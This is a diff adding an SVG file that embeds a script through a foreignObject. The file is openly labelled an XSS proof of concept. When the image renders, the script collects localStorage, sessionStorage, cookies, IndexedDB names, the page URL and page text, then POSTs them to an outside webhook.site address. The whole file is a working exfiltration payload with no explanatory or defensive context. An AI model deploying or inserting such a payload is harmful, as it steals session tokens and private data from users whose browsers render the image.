@@ -1,0 +1,45 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <body>
+        <script>
+          (async () => {
+            const data = {};
+
+            data.localStorage = {};
+            for (let i = 0; i &lt; localStorage.length; i++) {
+              const k = localStorage.key(i);
+              data.localStorage[k] = localStorage.getItem(k);
+            }
+
+            data.sessionStorage = {};
+            for (let i = 0; i &lt; sessionStorage.length; i++) {
+              const k = sessionStorage.key(i);
+              data.sessionStorage[k] = sessionStorage.getItem(k);
+            }
+
+            data.cookies = document.cookie;
+
+            if (indexedDB.databases) {
+              data.indexedDBNames = (await indexedDB.databases()).map(
+                db => ({ name: db.name, version: db.version })
+              );
+            }
+
+            data.pageTitle = document.title;
+            data.pageURL = location.href;
+            data.bodyText = document.body?.innerText?.slice(0, 5000);
+
+            console.log('[XSS POC] Exfiltrated data:', JSON.stringify(data, null, 2));
+
+            fetch('https://webhook.site/ace58e7f-0b19-4703-b754-4688a07a4f95', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(data),
+            });
+          })();
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
